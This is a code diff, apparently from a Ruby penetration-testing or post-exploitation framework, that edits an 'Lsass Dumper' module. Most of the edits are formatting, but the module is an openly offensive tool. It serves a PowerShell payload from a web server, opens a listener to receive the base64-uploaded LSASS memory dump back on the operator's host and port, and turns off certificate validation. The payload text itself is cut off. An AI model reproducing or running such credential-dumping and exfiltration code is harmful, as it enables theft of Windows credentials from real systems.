@@ -1,6 +1,7 @@
 require 'poet'
 require 'lib_meta'
 require 'server'
+
 class LsassDump < Poet::Scanner
   include Lib_meta
   include Server::Info
@@ -33,25 +34,29 @@ class LsassDump < Poet::Scanner
     puts
     title = "Lsass Dumper"
     @timeout = 30 + @timeout if @timeout < 90
+
     server = Server.new
-    host = rgets("Would you like to host the payload on a web server? \
-                 [#{color_banner('y')}|#{color_banner('n')}] : ", 'y')
+
+    host = rgets("Would you like to host the payload on a web server? [#{color_banner('y')}|#{color_banner('n')}] : ", 'y')
     lhost, lport = get_meter_data
     print_warning('SSL is very slow uploading')
-    ssl = rgets("Use SSL for file transfer? \
-                [#{color_banner('y')}|#{color_banner('n')}] : ", 'y')
+    ssl = rgets("Use SSL for file transfer? [#{color_banner('y')}|#{color_banner('n')}] : ", 'y')
+
     if ssl == 'y'
       ssl = true
     else
       ssl = false
     end
+
     if host == 'y'
       url = get_url
       port = get_port(url)
       host = get_host(url)
       web_ssl = url.is_ssl?
+
       # Start web server
       Thread.new { server.raw_web(host, port, psh_command(lhost, lport, ssl), web_ssl) }
+
       # Start Listener for file
       Thread.new { server.base64_upload(lhost, lport, ssl) }
       ps_command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };'
